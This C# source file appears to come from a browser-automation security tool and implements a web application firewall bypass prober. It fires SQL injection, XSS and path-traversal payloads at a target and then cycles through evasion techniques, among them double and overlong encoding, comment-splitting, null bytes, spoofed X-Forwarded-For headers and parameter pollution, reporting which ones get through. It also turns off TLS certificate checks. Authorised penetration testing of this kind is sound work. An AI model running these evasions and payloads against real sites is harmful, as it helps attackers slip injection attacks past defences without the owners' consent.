using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.RegularExpressions;
using Trowser.Automation;

namespace Trowser.Security;

public sealed class WafBypassOptions
{
    /// <summary>Request URL template with §PAYLOAD§ or {{PAYLOAD}} marker, or a plain URL when <see cref="ParamName"/> is set.</summary>
    public string? Url { get; init; }

    public string Method { get; init; } = "GET";
    public Dictionary<string, string>? Headers { get; init; }
    public string? Body { get; init; }

    /// <summary>Query/body parameter name when <see cref="Url"/> has no fuzz marker.</summary>
    public string? ParamName { get; init; }

    /// <summary>Benign value substituted for baseline requests (default: 1).</summary>
    public string BaselineValue { get; init; } = "1";

    /// <summary>Canonical attack payload used to trigger WAF blocking (default depends on <see cref="Category"/>).</summary>
    public string? ProbePayload { get; init; }

    /// <summary>sqli | xss | lfi | custom — selects default probe payload when <see cref="ProbePayload"/> is omitted.</summary>
    public string Category { get; init; } = "sqli";

    /// <summary>Subset of technique ids to run; null = all.</summary>
    public List<string>? Techniques { get; init; }

    public int TimeoutMs { get; init; } = 15000;
    public bool UseBackendFetch { get; init; }
    public bool IncludeBrowserCookies { get; init; } = true;
}

public sealed class WafBypassProbeRow
{
    public string Technique { get; init; } = "";
    public string Category { get; init; } = "";
    public string Verdict { get; init; } = ""; // blocked | bypassed | inconclusive | skipped
    public int Status { get; init; }
    public int BaselineStatus { get; init; }
    public int DirectBlockStatus { get; init; }
    public int BodyLength { get; init; }
    public int BaselineBodyLength { get; init; }
    public long DurationMs { get; init; }
    public string? Detail { get; init; }
    public string? AppliedPayload { get; init; }
    public string? RequestUrl { get; init; }
}

public sealed class WafBypassResult
{
    public string TargetUrl { get; init; } = "";
    public string Method { get; init; } = "";
    public string ProbePayload { get; init; } = "";
    public string Category { get; init; } = "";
    public bool WafBlockDetected { get; init; }
    public string Message { get; init; } = "";
    public List<string> WafIndicators { get; init; } = [];
    public List<WafBypassProbeRow> Techniques { get; init; } = [];
    public List<string> UsableBypasses { get; init; } = [];
    public long ElapsedMs { get; init; }

    public string Format(bool includeDetails = true)
    {
        var sb = new StringBuilder();
        sb.AppendLine("=== WAF Bypass Probe ===");
        sb.AppendLine($"Target: {Method} {TargetUrl}");
        sb.AppendLine($"Category: {Category}  Probe: {ProbePayload}");
        sb.AppendLine($"WAF block detected: {(WafBlockDetected ? "yes" : "no")}");
        if (WafIndicators.Count > 0)
            sb.AppendLine($"Indicators: {string.Join(", ", WafIndicators)}");
        sb.AppendLine(Message);
        if (UsableBypasses.Count > 0)
        {
            sb.AppendLine("");
            sb.AppendLine($"Usable bypasses ({UsableBypasses.Count}):");
            foreach (var b in UsableBypasses)
                sb.AppendLine($"  + {b}");
        }

        if (includeDetails && Techniques.Count > 0)
        {
            sb.AppendLine("");
            sb.AppendLine("--- Techniques ---");
            foreach (var t in Techniques)
            {
                sb.AppendLine($"  [{t.Verdict,-12}] {t.Technique} ({t.Category}) HTTP {t.Status} ({t.DurationMs}ms)");
                if (!string.IsNullOrEmpty(t.Detail))
                    sb.AppendLine($"      {t.Detail}");
            }
        }

        sb.AppendLine("========================");
        return sb.ToString();
    }
}

/// <summary>
/// Probes which classic WAF bypass techniques reach the backend when a canonical attack payload is blocked.
/// Focuses on practical bypass verification, not WAF vendor fingerprinting (use wafw00f / tech-stack for that).
/// </summary>
public static class WafBypassProbe
{
    private static readonly Dictionary<string, string> DefaultProbePayloads = new(StringComparer.OrdinalIgnoreCase)
    {
        ["sqli"] = "' OR 1=1--",
        ["xss"] = "<script>alert(1)</script>",
        ["lfi"] = "../../../etc/passwd",
        ["custom"] = "' OR 1=1--",
    };

    private static readonly string[] WafBodyMarkers =
    [
        "request blocked", "access denied", "forbidden", "not acceptable", "security policy",
        "modsecurity", "cloudflare", "incapsula", "imperva", "sucuri", "akamai", "barracuda",
        "f5 big-ip", "blocked by", "waf", "firewall", "malicious", "attack detected",
        "attention required", "cf-error", "your request has been blocked"
    ];

    private static readonly int[] WafBlockStatuses = [403, 406, 429, 501, 503];

    public static async Task<WafBypassResult> RunAsync(
        AutomationContext ctx,
        WafBypassOptions options,
        Action<string, string>? log = null,
        CancellationToken ct = default)
    {
        var sw = Stopwatch.StartNew();
        var method = string.IsNullOrWhiteSpace(options.Method) ? "GET" : options.Method.Trim().ToUpperInvariant();
        var category = (options.Category ?? "sqli").Trim().ToLowerInvariant();
        var probePayload = options.ProbePayload
            ?? (DefaultProbePayloads.TryGetValue(category, out var d) ? d : DefaultProbePayloads["sqli"]);
        var baselineValue = string.IsNullOrEmpty(options.BaselineValue) ? "1" : options.BaselineValue;
        var timeout = options.TimeoutMs > 0 ? options.TimeoutMs : 15000;

        var (urlTemplate, bodyTemplate, paramName) = await ResolveTemplatesAsync(options, ctx);
        if (string.IsNullOrWhiteSpace(urlTemplate))
            throw new InvalidOperationException("Provide url (with §PAYLOAD§ marker or paramName) before running WAF bypass probe.");

        async Task<(int status, string body, long ms)> SendAsync(
            string payload,
            WafRequestMutation? mutation = null)
        {
            mutation ??= WafRequestMutation.Identity;
            var url = mutation.TransformUrl(BuildUrl(urlTemplate, paramName, payload, method));
            var body = mutation.TransformBody(SubstituteBody(bodyTemplate, payload));
            var headers = mutation.TransformHeaders(options.Headers);

            var swReq = Stopwatch.StartNew();
            var json = await DoFetchAsync(ctx, url, method, headers, body, timeout, options, ct);
            swReq.Stop();
            var (status, text, _) = ParseFetchJson(json);
            return (status, text, swReq.ElapsedMilliseconds);
        }

        log?.Invoke($"WafBypass: baseline + direct probe on {method} {urlTemplate}", "#888888");

        var (baseStatus, baseBody, baseMs) = await SendAsync(baselineValue);
        ct.ThrowIfCancellationRequested();
        var (directStatus, directBody, directMs) = await SendAsync(probePayload);
        ct.ThrowIfCancellationRequested();

        var directFingerprint = ResponseFingerprint(directStatus, directBody);
        var baseFingerprint = ResponseFingerprint(baseStatus, baseBody);
        var wafIndicators = CollectWafIndicators(directStatus, directBody);
        var wafBlockDetected = IsBlocked(directStatus, directBody, baseStatus, baseBody)
            && !string.Equals(directFingerprint, baseFingerprint, StringComparison.Ordinal);

        var rows = new List<WafBypassProbeRow>();
        var usable = new List<string>();

        if (!wafBlockDetected)
        {
            sw.Stop();
            return new WafBypassResult
            {
                TargetUrl = BuildUrl(urlTemplate, paramName, probePayload, method),
                Method = method,
                ProbePayload = probePayload,
                Category = category,
                WafBlockDetected = false,
                WafIndicators = wafIndicators,
                Message = "Canonical probe did not produce a clear WAF block vs baseline. " +
                    "Try a different probePayload/category, or confirm the injection point reaches the server.",
                Techniques = rows,
                UsableBypasses = usable,
                ElapsedMs = sw.ElapsedMilliseconds
            };
        }

        var catalog = BuildTechniqueCatalog(probePayload, urlTemplate, paramName, method, bodyTemplate);
        var selected = options.Techniques is { Count: > 0 }
            ? catalog.Where(t => options.Techniques.Contains(t.Id, StringComparer.OrdinalIgnoreCase)).ToList()
            : catalog;

        log?.Invoke($"WafBypass: block detected (HTTP {directStatus}); testing {selected.Count} technique(s)", "#CCA700");

        foreach (var tech in selected)
        {
            ct.ThrowIfCancellationRequested();
            try
            {
                var transformedPayload = tech.TransformPayload(probePayload);
                var (status, body, ms) = await SendAsync(transformedPayload, tech.Mutation);
                var verdict = ClassifyVerdict(status, body, baseStatus, baseBody, directStatus, directBody);

                if (verdict == "bypassed")
                    usable.Add(tech.Id);

                rows.Add(new WafBypassProbeRow
                {
                    Technique = tech.Id,
                    Category = tech.Category,
                    Verdict = verdict,
                    Status = status,
                    BaselineStatus = baseStatus,
                    DirectBlockStatus = directStatus,
                    BodyLength = body.Length,
                    BaselineBodyLength = baseBody.Length,
                    DurationMs = ms,
                    Detail = tech.Description,
                    AppliedPayload = transformedPayload.Length > 120 ? transformedPayload[..120] + "…" : transformedPayload,
                    RequestUrl = tech.Mutation.TransformUrl(BuildUrl(urlTemplate, paramName, transformedPayload, method))
                });

                log?.Invoke($"  [{verdict}] {tech.Id}", verdict == "bypassed" ? "#F44747" : "#888888");
            }
            catch (Exception ex)
            {
                rows.Add(new WafBypassProbeRow
                {
                    Technique = tech.Id,
                    Category = tech.Category,
                    Verdict = "inconclusive",
                    BaselineStatus = baseStatus,
                    DirectBlockStatus = directStatus,
                    Detail = ex.Message
                });
            }
        }

        sw.Stop();
        var msg = usable.Count > 0
            ? $"{usable.Count} bypass technique(s) appear to reach the backend — re-run targeted fuzz/SQLi with those transforms."
            : "No bypass techniques succeeded against this injection point (WAF may be effective or heuristics missed subtle bypasses).";

        return new WafBypassResult
        {
            TargetUrl = BuildUrl(urlTemplate, paramName, probePayload, method),
            Method = method,
            ProbePayload = probePayload,
            Category = category,
            WafBlockDetected = true,
            WafIndicators = wafIndicators,
            Message = msg,
            Techniques = rows,
            UsableBypasses = usable,
            ElapsedMs = sw.ElapsedMilliseconds
        };
    }

    private static async Task<(string urlTemplate, string? bodyTemplate, string? paramName)> ResolveTemplatesAsync(
        WafBypassOptions options, AutomationContext ctx)
    {
        var url = options.Url;
        if (string.IsNullOrWhiteSpace(url))
        {
            url = await ctx.GetCurrentUrl();
            if (string.IsNullOrWhiteSpace(url))
                throw new InvalidOperationException("Navigate to a page or provide url.");
        }

        if (RequestMarkerSubstitute.ListMarkers(url, options.Body).Count > 0)
            return (url, options.Body, null);

        if (!string.IsNullOrWhiteSpace(options.ParamName))
            return (url, options.Body, options.ParamName);

        throw new InvalidOperationException(
            "url must contain a §PAYLOAD§ / {{PAYLOAD}} marker, or set paramName for query/body injection.");
    }

    private static string BuildUrl(string urlTemplate, string? paramName, string payload, string method)
    {
        if (paramName == null)
            return RequestMarkerSubstitute.ReplaceAll(urlTemplate, payload);

        if (!Uri.TryCreate(urlTemplate, UriKind.Absolute, out var uri))
            return urlTemplate;

        if (string.Equals(method, "GET", StringComparison.OrdinalIgnoreCase)
            || string.Equals(method, "HEAD", StringComparison.OrdinalIgnoreCase))
        {
            var ub = new UriBuilder(uri);
            var q = ParseQuery(ub.Query);
            q[paramName] = payload;
            ub.Query = BuildQuery(q);
            return ub.Uri.ToString();
        }

        return urlTemplate;
    }

    private static string? SubstituteBody(string? bodyTemplate, string payload)
    {
        if (bodyTemplate == null) return null;
        var trimmed = bodyTemplate.TrimStart();
        if (trimmed.StartsWith('{') || trimmed.StartsWith('['))
        {
            try
            {
                var node = JsonNode.Parse(bodyTemplate);
                if (node != null)
                {
                    SubstituteMarkersInJsonNode(node, payload);
                    return node.ToJsonString();
                }
            }
            catch (JsonException) { /* fall back */ }
        }

        return RequestMarkerSubstitute.ReplaceAll(bodyTemplate, payload);
    }

    private static void SubstituteMarkersInJsonNode(JsonNode? node, string value)
    {
        switch (node)
        {
            case JsonObject o:
                foreach (var p in o.ToList())
                {
                    if (p.Value is JsonValue jv && jv.TryGetValue<string>(out var s) && s != null)
                        o[p.Key] = RequestMarkerSubstitute.ReplaceAll(s, value);
                    else
                        SubstituteMarkersInJsonNode(p.Value, value);
                }
                break;
            case JsonArray a:
                for (var i = 0; i < a.Count; i++)
                {
                    if (a[i] is JsonValue jv && jv.TryGetValue<string>(out var s) && s != null)
                        a[i] = RequestMarkerSubstitute.ReplaceAll(s, value);
                    else
                        SubstituteMarkersInJsonNode(a[i], value);
                }
                break;
        }
    }

    private static async Task<string> DoFetchAsync(
        AutomationContext ctx,
        string url,
        string method,
        Dictionary<string, string>? headers,
        string? body,
        int timeoutMs,
        WafBypassOptions options,
        CancellationToken ct)
    {
        if (!options.UseBackendFetch)
            return await ctx.Fetch(url, method, headers, body, timeoutMs);

        Dictionary<string, string>? merged = headers is { Count: > 0 }
            ? new Dictionary<string, string>(headers, StringComparer.OrdinalIgnoreCase)
            : null;
        if (options.IncludeBrowserCookies)
        {
            var ck = await ctx.GetCookieHeaderForUrl(url);
            if (!string.IsNullOrEmpty(ck))
            {
                merged ??= new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                if (merged.TryGetValue("Cookie", out var existing) && !string.IsNullOrEmpty(existing))
                    merged["Cookie"] = existing + "; " + ck;
                else
                    merged["Cookie"] = ck;
            }
        }

        return await ServerSideHttpAsFetchJsonAsync(url, method, merged, body, timeoutMs, ct);
    }

    private static async Task<string> ServerSideHttpAsFetchJsonAsync(
        string url,
        string method,
        Dictionary<string, string>? headers,
        string? body,
        int timeoutMs,
        CancellationToken ct)
    {
        using var handler = new HttpClientHandler
        {
            AllowAutoRedirect = true,
            ServerCertificateCustomValidationCallback = (_, _, _, _) => true
        };
        using var client = new HttpClient(handler)
        {
            Timeout = TimeSpan.FromMilliseconds(Math.Clamp(timeoutMs, 500, 600_000))
        };
        using var msg = new HttpRequestMessage(new HttpMethod(method), url);
        if (body != null)
        {
            var trimmedB = body.TrimStart();
            if (trimmedB.StartsWith("{", StringComparison.Ordinal) || trimmedB.StartsWith("[", StringComparison.Ordinal))
                msg.Content = new StringContent(body, Encoding.UTF8, "application/json");
            else
                msg.Content = new StringContent(body, Encoding.UTF8);
        }

        if (headers != null)
        {
            foreach (var kv in headers)
            {
                if (!msg.Headers.TryAddWithoutValidation(kv.Key, kv.Value))
                    msg.Content?.Headers.TryAddWithoutValidation(kv.Key, kv.Value);
            }
        }

        using var resp = await client.SendAsync(msg, ct).ConfigureAwait(false);
        var text = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
        return JsonSerializer.Serialize(new
        {
            ok = resp.IsSuccessStatusCode,
            status = (int)resp.StatusCode,
            statusText = resp.ReasonPhrase ?? "",
            redirected = false,
            type = "server-side",
            url,
            body = text
        });
    }

    private static (int status, string body, bool ok) ParseFetchJson(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var status = root.GetProperty("status").GetInt32();
            var body = root.TryGetProperty("body", out var b)
                ? b.ValueKind == JsonValueKind.String ? b.GetString() ?? "" : b.GetRawText()
                : "";
            var ok = root.TryGetProperty("ok", out var o) && o.ValueKind == JsonValueKind.True;
            return (status, body, ok);
        }
        catch
        {
            return (0, "", false);
        }
    }

    private static string ResponseFingerprint(int status, string body)
    {
        var sample = body.Length > 512 ? body[..512] : body;
        sample = Regex.Replace(sample, @"\d+", "#", RegexOptions.CultureInvariant);
        return $"{status}:{sample.Length}:{sample.GetHashCode()}";
    }

    private static bool IsBlocked(int status, string body, int baselineStatus, string baselineBody)
    {
        if (WafBlockStatuses.Contains(status) && status != baselineStatus)
            return true;
        if (status >= 400 && baselineStatus < 400)
            return true;

        var lower = body.ToLowerInvariant();
        foreach (var marker in WafBodyMarkers)
        {
            if (lower.Contains(marker, StringComparison.Ordinal) &&
                !baselineBody.Contains(marker, StringComparison.OrdinalIgnoreCase))
                return true;
        }

        return false;
    }

    private static List<string> CollectWafIndicators(int status, string body)
    {
        var list = new List<string>();
        if (WafBlockStatuses.Contains(status))
            list.Add($"HTTP {status}");

        var lower = body.ToLowerInvariant();
        foreach (var marker in WafBodyMarkers)
        {
            if (lower.Contains(marker, StringComparison.Ordinal))
                list.Add($"body:{marker}");
        }

        return list.Distinct(StringComparer.OrdinalIgnoreCase).Take(8).ToList();
    }

    private static string ClassifyVerdict(
        int status, string body,
        int baseStatus, string baseBody,
        int directStatus, string directBody)
    {
        var fp = ResponseFingerprint(status, body);
        var directFp = ResponseFingerprint(directStatus, directBody);
        var baseFp = ResponseFingerprint(baseStatus, baseBody);

        if (string.Equals(fp, directFp, StringComparison.Ordinal))
            return "blocked";

        if (string.Equals(fp, baseFp, StringComparison.Ordinal))
            return "bypassed";

        if (!IsBlocked(status, body, baseStatus, baseBody) && IsBlocked(directStatus, directBody, baseStatus, baseBody))
            return "bypassed";

        if (IsBlocked(status, body, baseStatus, baseBody))
            return "blocked";

        if (status == baseStatus && Math.Abs(body.Length - baseBody.Length) < Math.Max(20, baseBody.Length / 20))
            return "bypassed";

        return "inconclusive";
    }

    private class WafRequestMutation
    {
        public static readonly WafRequestMutation Identity = new();

        public virtual string TransformUrl(string url) => url;
        public virtual string? TransformBody(string? body) => body;
        public virtual Dictionary<string, string>? TransformHeaders(Dictionary<string, string>? headers) => headers;
    }

    private sealed class WafTechnique
    {
        public required string Id { get; init; }
        public required string Category { get; init; }
        public required string Description { get; init; }
        public Func<string, string> TransformPayload { get; init; } = p => p;
        public WafRequestMutation Mutation { get; init; } = WafRequestMutation.Identity;
    }

    private static List<WafTechnique> BuildTechniqueCatalog(
        string probePayload, string urlTemplate, string? paramName, string method, string? bodyTemplate)
    {
        var list = new List<WafTechnique>
        {
            new()
            {
                Id = "url-encoding",
                Category = "encoding",
                Description = "URL-encode special characters once",
                TransformPayload = UrlEncodeOnce
            },
            new()
            {
                Id = "double-url-encoding",
                Category = "encoding",
                Description = "Double URL-encode special characters (%27 → %2527)",
                TransformPayload = p => UrlEncodeOnce(UrlEncodeOnce(p))
            },
            new()
            {
                Id = "unicode-overlong",
                Category = "encoding",
                Description = "Overlong UTF-8 encoding of quotes and slashes",
                TransformPayload = UnicodeOverlongEncode
            },
            new()
            {
                Id = "mixed-case",
                Category = "tokenization",
                Description = "Alternate letter case (SeLeCt, ScRiPt) to evade case-sensitive rules",
                TransformPayload = MixedCase
            },
            new()
            {
                Id = "inline-comment",
                Category = "tokenization",
                Description = "Insert /**/ between SQL/XSS tokens",
                TransformPayload = InlineCommentSplit
            },
            new()
            {
                Id = "whitespace-variant",
                Category = "tokenization",
                Description = "Replace spaces with tabs, newlines, or comment gaps",
                TransformPayload = WhitespaceVariant
            },
            new()
            {
                Id = "null-byte",
                Category = "tokenization",
                Description = "Insert %00 between tokens",
                TransformPayload = NullByteSplit
            },
            new()
            {
                Id = "concat-break",
                Category = "tokenization",
                Description = "Break keywords with comments and encoding (e.g. UN/**/ION)",
                TransformPayload = ConcatBreak
            },
            new()
            {
                Id = "xff-spoof",
                Category = "headers",
                Description = "X-Forwarded-For: 127.0.0.1 — some WAFs whitelist internal IPs",
                Mutation = new HeaderMutation(new Dictionary<string, string> { ["X-Forwarded-For"] = "127.0.0.1" })
            },
            new()
            {
                Id = "x-real-ip-spoof",
                Category = "headers",
                Description = "X-Real-IP: 127.0.0.1",
                Mutation = new HeaderMutation(new Dictionary<string, string> { ["X-Real-IP"] = "127.0.0.1" })
            },
            new()
            {
                Id = "x-original-url",
                Category = "headers",
                Description = "X-Original-URL with benign path (IIS/rewrite bypass class)",
                Mutation = new OriginalUrlMutation()
            },
            new()
            {
                Id = "method-override",
                Category = "headers",
                Description = "X-HTTP-Method-Override when POST body carries payload",
                Mutation = new MethodOverrideMutation(method)
            },
            new()
            {
                Id = "path-normalization",
                Category = "path",
                Description = "Insert /./ or // in URL path before query string",
                Mutation = new PathNormalizationMutation()
            },
            new()
            {
                Id = "param-pollution",
                Category = "parameter",
                Description = "Duplicate parameter: benign value first, payload second (HPP)",
                Mutation = new ParamPollutionMutation(paramName, probePayload)
            },
        };

        if (!string.IsNullOrEmpty(bodyTemplate) && string.Equals(method, "POST", StringComparison.OrdinalIgnoreCase))
        {
            list.Add(new WafTechnique
            {
                Id = "content-type-form",
                Category = "body",
                Description = "Send JSON template as application/x-www-form-urlencoded",
                Mutation = new ContentTypeFormMutation()
            });
        }

        return list;
    }

    private static string UrlEncodeOnce(string input)
    {
        var sb = new StringBuilder(input.Length * 2);
        foreach (var c in input)
        {
            if (char.IsLetterOrDigit(c) || c is '-' or '_' or '.' or '~')
                sb.Append(c);
            else
                sb.Append('%').Append(((int)c).ToString("X2"));
        }

        return sb.ToString();
    }

    private static string UnicodeOverlongEncode(string input) =>
        input
            .Replace("'", "%c0%27", StringComparison.Ordinal)
            .Replace("\"", "%c0%22", StringComparison.Ordinal)
            .Replace("/", "%c0%af", StringComparison.Ordinal)
            .Replace("\\", "%c1%9c", StringComparison.Ordinal);

    private static string MixedCase(string input)
    {
        var sb = new StringBuilder(input.Length);
        var flip = false;
        foreach (var c in input)
        {
            if (char.IsLetter(c))
            {
                sb.Append(flip ? char.ToUpperInvariant(c) : char.ToLowerInvariant(c));
                flip = !flip;
            }
            else sb.Append(c);
        }

        return sb.ToString();
    }

    private static string InlineCommentSplit(string input)
    {
        var keywords = new[] { "select", "union", "or", "and", "script", "alert", "passwd", "../" };
        var result = input;
        foreach (var kw in keywords.OrderByDescending(k => k.Length))
        {
            if (result.Contains(kw, StringComparison.OrdinalIgnoreCase))
            {
                var pattern = Regex.Escape(kw);
                result = Regex.Replace(result, pattern, m =>
                {
                    var word = m.Value;
                    if (word.Length <= 2) return word;
                    return string.Join("/**/", word.Select(ch => ch.ToString()));
                }, RegexOptions.IgnoreCase);
            }
        }

        return result;
    }

    private static string WhitespaceVariant(string input) =>
        input
            .Replace(" ", "/**/", StringComparison.Ordinal)
            .Replace("--", "-%0a-", StringComparison.Ordinal);

    private static string NullByteSplit(string input)
    {
        var sb = new StringBuilder(input.Length * 3);
        foreach (var c in input)
        {
            sb.Append(c);
            if (c is ' ' or '\'' or '"' or '/' or '=')
                sb.Append("%00");
        }

        return sb.ToString();
    }

    private static string ConcatBreak(string input) =>
        InlineCommentSplit(MixedCase(input));

    private static Dictionary<string, string> ParseQuery(string? query)
    {
        var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        if (string.IsNullOrEmpty(query)) return dict;
        var q = query.TrimStart('?');
        foreach (var part in q.Split('&', StringSplitOptions.RemoveEmptyEntries))
        {
            var idx = part.IndexOf('=');
            if (idx < 0)
                dict[Uri.UnescapeDataString(part)] = "";
            else
            {
                var k = Uri.UnescapeDataString(part[..idx]);
                var v = Uri.UnescapeDataString(part[(idx + 1)..]);
                dict[k] = v;
            }
        }

        return dict;
    }

    private static string BuildQuery(Dictionary<string, string> q)
    {
        if (q.Count == 0) return "";
        return string.Join("&", q.Select(kv =>
            $"{Uri.EscapeDataString(kv.Key)}={Uri.EscapeDataString(kv.Value)}"));
    }

    private sealed class HeaderMutation(Dictionary<string, string> extra) : WafRequestMutation
    {
        public override Dictionary<string, string>? TransformHeaders(Dictionary<string, string>? headers)
        {
            var merged = headers is { Count: > 0 }
                ? new Dictionary<string, string>(headers, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (var kv in extra)
                merged[kv.Key] = kv.Value;
            return merged;
        }
    }

    private sealed class OriginalUrlMutation : WafRequestMutation
    {
        public override Dictionary<string, string>? TransformHeaders(Dictionary<string, string>? headers)
        {
            var merged = headers is { Count: > 0 }
                ? new Dictionary<string, string>(headers, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            merged["X-Original-URL"] = "/";
            return merged;
        }
    }

    private sealed class MethodOverrideMutation(string method) : WafRequestMutation
    {
        public override Dictionary<string, string>? TransformHeaders(Dictionary<string, string>? headers)
        {
            if (string.Equals(method, "GET", StringComparison.OrdinalIgnoreCase))
                return headers;
            var merged = headers is { Count: > 0 }
                ? new Dictionary<string, string>(headers, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            merged["X-HTTP-Method-Override"] = method;
            return merged;
        }
    }

    private sealed class PathNormalizationMutation : WafRequestMutation
    {
        public override string TransformUrl(string url)
        {
            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
                return url;
            var path = uri.AbsolutePath;
            if (string.IsNullOrEmpty(path) || path == "/")
                return url;
            var normalized = path.Replace("/", "/./", StringComparison.Ordinal);
            var ub = new UriBuilder(uri) { Path = normalized };
            return ub.Uri.ToString();
        }
    }

    private sealed class ParamPollutionMutation(string? paramName, string probePayload) : WafRequestMutation
    {
        public override string TransformUrl(string url)
        {
            if (paramName == null || !Uri.TryCreate(url, UriKind.Absolute, out var uri))
                return url;
            var ub = new UriBuilder(uri);
            var q = ParseQuery(ub.Query);
            if (!q.TryGetValue(paramName, out var payload))
                payload = probePayload;
            ub.Query = $"{Uri.EscapeDataString(paramName)}=1&{Uri.EscapeDataString(paramName)}={Uri.EscapeDataString(payload)}";
            return ub.Uri.ToString();
        }
    }

    private sealed class ContentTypeFormMutation : WafRequestMutation
    {
        public override string? TransformBody(string? body)
        {
            if (body == null) return null;
            try
            {
                using var doc = JsonDocument.Parse(body);
                if (doc.RootElement.ValueKind != JsonValueKind.Object)
                    return body;
                var parts = new List<string>();
                foreach (var p in doc.RootElement.EnumerateObject())
                {
                    var val = p.Value.ValueKind == JsonValueKind.String ? p.Value.GetString() ?? "" : p.Value.GetRawText();
                    parts.Add($"{Uri.EscapeDataString(p.Name)}={Uri.EscapeDataString(val)}");
                }

                return string.Join("&", parts);
            }
            catch
            {
                return body;
            }
        }

        public override Dictionary<string, string>? TransformHeaders(Dictionary<string, string>? headers)
        {
            var merged = headers is { Count: > 0 }
                ? new Dictionary<string, string>(headers, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            merged["Content-Type"] = "application/x-www-form-urlencoded";
            return merged;
        }
    }
}
